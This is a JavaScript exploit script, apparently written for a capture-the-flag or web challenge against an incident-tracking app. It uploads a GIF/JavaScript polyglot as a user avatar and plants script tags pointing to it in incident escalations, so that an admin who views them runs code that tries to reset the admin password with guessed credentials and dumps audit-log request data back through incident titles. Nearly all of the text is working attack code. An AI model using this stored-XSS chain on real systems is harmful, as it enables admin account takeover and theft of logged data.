// P9: Developer bot creates escalation with admin XSS payload
// The admin XSS tries to change admin password AND read audit entries
(async () => {
  var O = self.location.origin;
  var P = function(t) {
    return fetch(O + '/api/incidents', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
    }).catch(function() {});
  };

  await P('P9|START');

  // Admin XSS payload: try password change + dump audit entries 1-10
  var js = [
    'GIF89a=1;(async()=>{',
    "var O=self.location.origin;",
    "var P=function(t){return fetch(O+'/api/incidents',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:String(t).slice(0,105),facility:'Meridian-2',severity:'Watch'})}).catch(function(){})};",
    // Try changing password without knowing current (might work for admin)
    "try{var c1=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:'Pwned2025!',confirm:'Pwned2025!'})});await P('ADM9|PW1|'+c1.status+'|'+(await c1.text()).slice(0,60))}catch(e){await P('ADM9|PW1E|'+e)}",
    // Try with Summer2025! as current
    "try{var c2=await fetch(O+'/api/profile/password',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({current:'Summer2025!',password:'Pwned2025!',confirm:'Pwned2025!'})});await P('ADM9|PW2|'+c2.status+'|'+(await c2.text()).slice(0,60))}catch(e){}",
    // Read audit entries 1-10 for request_dump
    "for(var i=1;i<=10;i++){try{var r=await fetch(O+'/api/admin/audit?log='+i,{credentials:'same-origin'});var j=await r.json();var e=j.entry||j;if(e.request_dump){var d=e.request_dump;var n=Math.ceil(d.length/80);for(var c=0;c<n&&c<15;c++)await P('ADM9|RD|'+i+'|'+(c+1)+'/'+n+'|'+d.slice(c*80,(c+1)*80))}else{await P('ADM9|AU|'+i+'|'+(e.actor||'?')+'|'+(e.action||'?'))}}catch(e){}}",
    "await P('ADM9|DONE')})()"
  ].join('');

  // Upload as avatar via developer
  var b64 = btoa(js);
  var avatarUri = 'data:image/gif;base64,' + b64;

  var upRes = await fetch(O + '/api/profile', {
    method: 'POST', credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Dev Bot', organization: 'AegisCore', avatar: avatarUri })
  });
  await P('P9|UPLOAD|' + upRes.status);

  var meRes = await (await fetch(O + '/api/me', { credentials: 'same-origin' })).json();
  var avatarPath = (meRes.user || {}).avatar || '';
  await P('P9|AVATAR|' + avatarPath);

  var xss = '<script src=' + avatarPath + '></script>';

  // Create new incidents and escalate
  for (var i = 0; i < 3; i++) {
    try {
      await fetch(O + '/api/incidents', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'P9 diag ' + Date.now() + '_' + i, facility: 'Meridian-2', severity: 'Critical' })
      });
    } catch(e) {}
  }

  // Get our new incidents
  var list = await (await fetch(O + '/api/incidents', { credentials: 'same-origin' })).json();
  var myIncs = (list.incidents || []).filter(function(x) { return (x.title || '').indexOf('P9 diag') === 0; });

  for (var j = 0; j < myIncs.length; j++) {
    try {
      var esc = await fetch(O + '/api/incidents/' + myIncs[j].id + '/escalate', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ details: xss })
      });
      await P('P9|ESC|' + myIncs[j].id + '|' + esc.status);
    } catch(e) {}
  }

  // Also try seed incidents
  for (var k = 1; k <= 3; k++) {
    try {
      var esc = await fetch(O + '/api/incidents/' + k + '/escalate', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ details: xss })
      });
      await P('P9|SESC|' + k + '|' + esc.status);
    } catch(e) {}
  }

  await P('P9|DONE');
})();
